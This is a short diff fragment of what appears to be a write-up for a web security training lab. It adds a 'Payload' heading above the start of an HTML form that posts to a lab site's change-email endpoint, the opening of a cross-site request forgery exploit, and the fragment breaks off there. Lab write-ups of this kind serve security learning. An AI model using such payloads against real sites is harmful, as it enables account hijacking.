@@ -37,9 +37,11 @@ Set-Cookie: csrf=fake; SameSite=None; Secure; HttpOnly
 Content-Type: text/html; charset=utf-8
 X-Frame-Options: SAMEORIGIN
 Content-Length: 3440
-``
+```
 
 ```bash
+# Payload
+
 <html>
   <body>
     <form action="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/my-account/change-email" method="POST">
